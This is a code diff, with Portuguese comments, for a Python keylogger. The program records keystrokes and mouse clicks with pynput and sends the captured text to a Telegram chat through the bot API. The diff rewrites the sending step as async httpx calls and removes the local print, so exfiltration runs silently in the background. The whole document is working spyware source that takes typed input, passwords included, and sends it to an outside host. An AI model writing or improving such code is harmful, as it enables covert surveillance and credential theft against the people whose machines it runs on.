@@ -1,8 +1,10 @@
 from pynput.keyboard import Key, Listener
 from pynput import mouse
 from dotenv import load_dotenv
+from pynput import keyboard, mouse
 
-import requests
+import httpx
+import asyncio
 import telebot
 import re
 import getpass
@@ -26,11 +28,12 @@ if not BOT_TOKEN or not CHAT_ID:
     raise RuntimeError(
         "BOT_TOKEN e CHAT_ID não foram encontrados. Verifique o arquivo .env."
     )
+    
 
 BOT = telebot.TeleBot(BOT_TOKEN)
 
 
-def onPress(key):
+def onPress(key, loop):
     global WORDS
     global FULLLOG
 
@@ -46,8 +49,7 @@ def onPress(key):
         messageFormated = formatMessage(FULLLOG)
 
         if len(messageFormated.strip()) > 0 and len(messageFormated) <= CHAR_MAX_TO_SEND:
-            send(messageFormated)
-            print(messageFormated)
+            asyncio.run_coroutine_threadsafe(send(messageFormated), loop)
 
         WORDS = ''
         FULLLOG = ''
@@ -58,19 +60,20 @@ def onPress(key):
             char = char.replace("'", "")
             WORDS += char
     
-def send(message):
+async def send(message):
+    async with httpx.AsyncClient(timeout=10) as client:
 
-    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
+        url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
 
-    payload = {
-        'chat_id': CHAT_ID,
-        'text': HEADER_MESSAGE + "\n" + f"message: {message}",
-    }
+        payload = {
+            'chat_id': CHAT_ID,
+            'text': HEADER_MESSAGE + "\n" + f"message: {message}",
+        }
 
-    response = requests.post(url, data=payload)
-    return response.json()
+        response = await client.post(url, data=payload)
+        return response.json()
     
-def onClick(x, y, button, pressed):
+def onClick(x, y, button, pressed, loop):
     global FULLLOG
     global WORDS
 
@@ -81,8 +84,7 @@ def onClick(x, y, button, pressed):
             FULLLOG += WORDS + '\n'
 
             if len(messageFormated) <= CHAR_MAX_TO_SEND:
-                send(messageFormated)
-                print(messageFormated)
+                asyncio.run_coroutine_threadsafe(send(messageFormated), loop)
 
             WORDS = ''
             FULLLOG = ''
@@ -98,10 +100,22 @@ def formatMessage(message):
     message
     )
     
-def main():
-    with Listener(on_press=onPress) as k_listener, mouse.Listener(on_click=onClick) as m_listener:
-        k_listener.join()
-        m_listener.join()
+async def main():
+    loop = asyncio.get_running_loop()
+
+    # Inicia os listeners passando o 'loop' como parâmetro via lambda
+    k_listener = keyboard.Listener(on_press=lambda key: onPress(key, loop))
+    m_listener = mouse.Listener(on_click=lambda x, y, button, pressed: onClick(x, y, button, pressed, loop))
+
+    # Inicia os escutadores sem usar .join() bloqueante
+    k_listener.start()
+    m_listener.start()
+
+    while True:
+        await asyncio.sleep(3600)
 
 if __name__ == '__main__':
-    main()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("Programa encerrado.")
